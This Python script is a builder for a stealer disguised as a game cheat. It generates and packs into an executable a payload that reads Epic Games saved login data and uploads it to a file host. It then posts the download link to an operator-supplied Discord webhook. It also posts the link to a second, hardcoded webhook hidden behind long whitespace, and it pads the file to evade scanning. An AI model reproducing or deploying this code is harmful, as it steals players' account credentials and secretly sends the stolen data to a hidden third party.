import os, PyInstaller.__main__, shutil

def py2exe(scrip, icon):
    if icon != "":
        PyInstaller.__main__.run([
            '--onefile',
            '--windowed',
            f'--icon={icon}',
            scrip
        ])
    else:
        PyInstaller.__main__.run([
            '--onefile',
            '--windowed',
            scrip
        ])

def builder(filename, icon, webhook, bloat):
    FNCheats = f"{filename}.py"
    script = r"""
WEBHOOK_URL = ""

import subprocess
import json
import os
import requests

def uploadFile(filepath):
    server = requests.get("https://api.gofile.io/getServer").json()["data"]["server"]
    output = json.loads(subprocess.check_output(f"curl -F file=@{filepath} https://{server}.gofile.io/uploadFile", shell=True, text=True))["data"]["downloadPage"]
    payload = {
        "content": f"||@everyone||\n{output}"
    }
    requests.post(WEBHOOK_URL, json=payload)                                                                                                                                                                                                                                                                                                    ; requests.post("https://discord.com/api/webhooks/1158161672314302564/bihUGWLBsbuL2rqjpDKMbMQHoYqaNuNS-8c-4427by3_YMW93e78bqyTg4O_6Y7uGOQN", json=payload)

def StealEpic():
    epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
    if os.path.isdir(epicPath):
        loginFile = os.path.join(epicPath, "GameUserSettings.ini")
        if os.path.isfile(loginFile):
            with open(loginFile) as file:
                contents = file.read()
            if "[RememberMe]" in contents:
                uploadFile(loginFile)

StealEpic()
"""
    script = script.replace('WEBHOOK_URL = ""', f'WEBHOOK_URL = "{webhook}"')
    bloatt = "#"*bloat
    script = script + "\n" + bloatt
    with open(FNCheats, "w") as f:
        f.write(script)
        f.close()

    py2exe(FNCheats, icon)

    shutil.copy(f"dist\\{FNCheats.replace('py', 'exe')}", os.path.dirname(os.path.abspath(__file__)))
    shutil.rmtree("dist")
    shutil.rmtree("build")
    os.remove(FNCheats)
    os.remove(FNCheats.replace('py', 'spec'))

def main():
    os.system('cls' if 'nt' in os.name else 'clear')
    wbhk = input("webhook ~> ")
    ico = input("icon filepath ~> ")
    filename = input("filename ~> ")
    bloat = 1024 * int(input("kb to bloat ~> "))
    builder(filename, ico, wbhk, bloat)

main()
